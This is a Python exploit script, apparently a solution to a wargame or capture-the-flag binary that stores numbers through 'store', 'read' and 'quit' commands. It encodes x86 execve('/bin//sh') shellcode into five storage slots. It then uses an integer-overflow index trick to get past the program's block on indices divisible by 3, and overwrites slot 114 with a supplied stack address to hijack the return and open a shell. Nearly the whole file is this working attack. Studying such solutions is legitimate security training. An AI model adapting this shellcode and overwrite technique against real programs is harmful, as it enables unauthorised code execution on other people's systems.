import argparse
import sys
import os


def encode(input, reverse=True):
    if reverse:
        input = input[::-1]

    return int("".join((
        "%02x" % ord(chr)
        for chr in input
    )), 16)


def write_store(index, value):
    print("store")
    print(value)

    if index % 3 == 0:
        index = (4294967295 + 1) // 4 + index
    
    print(index)


def write_read(index):
    print("read")
    print(index)


def write_quit():
    print("quit")


def cmd_payload(args):
    esp = int(args.esp)

    write_store(0, encode("\x31\xc0\x50\x68"))
    write_store(1, encode("\x2f\x2f\x73\x68"))
    write_store(2, encode("\x68\x2f\x62\x69"))
    write_store(3, encode("\x6e\x89\xe3\x50"))
    write_store(4, encode("\xb0\x0b\xcd\x80"))

    write_store(114, esp)
    write_quit()

    sys.stdout.flush()
    os.system("cat")


def cmd_write_and_quit(args):
    index = int(args.index)

    write_store(index, encode("AAAA"))
    write_quit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers()

    payload_parser = subparsers.add_parser('payload')
    payload_parser.add_argument("esp")
    payload_parser.set_defaults(func=cmd_payload)

    write_and_quit_parser = subparsers.add_parser('write-and-quit')
    write_and_quit_parser.add_argument("index")
    write_and_quit_parser.set_defaults(func=cmd_write_and_quit)

    args = parser.parse_args()
    args.func(args)
